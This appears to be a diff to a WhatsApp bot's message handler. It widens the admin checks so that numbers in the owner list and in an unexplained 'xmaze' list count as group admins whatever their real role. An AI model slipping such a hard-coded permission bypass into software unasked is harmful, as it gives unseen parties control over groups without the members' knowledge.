@@ -1092,8 +1092,8 @@ export async function handler(chatUpdate) {
 		const bot = (m.isGroup ? participants.find(u => conn.decodeJid(u.id) == this.user.jid) : {}) || {} // Your Data*/
 		const user = (m.isGroup ? participants.find(u => conn.decodeJid(u.jid) === m.sender) : {}) || {};
         const bot = (m.isGroup ? participants.find(u => conn.decodeJid(u.jid) == this.user.jid) : {}) || {};
-		const isRAdmin = user?.admin == 'superadmin' || false
-		const isAdmin = isRAdmin || user?.admin == 'admin' || false // Is User Admin?
+		const isRAdmin = user?.admin == 'superadmin' || [global.conn.user.jid, ...global.owner, ...global.xmaze].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
+		const isAdmin = isRAdmin || user?.admin == 'admin' || [global.conn.user.jid, ...global.owner, ...global.xmaze].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false // Is User Admin?
 		const isBotAdmin = bot?.admin || false // Are you Admin?
 
 		const ___dirname = path.join(path.dirname(fileURLToPath(import.meta.url)), './plugins')
